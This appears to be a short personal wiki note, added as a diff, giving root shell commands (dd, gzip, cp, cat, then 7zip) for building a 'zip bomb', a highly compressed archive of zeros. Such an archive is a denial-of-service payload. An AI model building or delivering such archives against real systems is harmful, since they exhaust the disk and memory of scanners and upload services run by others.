@@ -1,0 +1,31 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2019-02-12T14:53:42-05:00
+
+====== Zip Bomb ======
+Created Tuesday 12 February 2019
+
+Create 2GB GB file of zeros
+
+[root@tpulliam c]# dd if=/dev/zero of=filename bs=1M count=2000
+2000+0 records in
+2000+0 records out
+2097152000 bytes (2.1 GB) copied, 4.25161 s, 493 MB/s
+
+
+compress the file
+
+[root@tpulliam c]# gzip filename
+[root@tpulliam c]# ll -h filename.gz
+-rw-r--r--. 1 root root 2.0M Feb 12 15:04 filename.gz
+
+That's a very impressive compression ratio. Let's copy the file.
+
+[root@tpulliam c]# cp filename.gz filename2.gz
+[root@tpulliam c]# cp filename.gz filename3.gz
+[root@tpulliam c]# cp filename.gz filename4.gz
+[root@tpulliam c]# cp filename.gz filename5.gz
+
+[root@tpulliam c]# cat filename* > file.gz
+
+repeat last step as many times as needed. Lastly, zip the master file into a 7zip archive. 
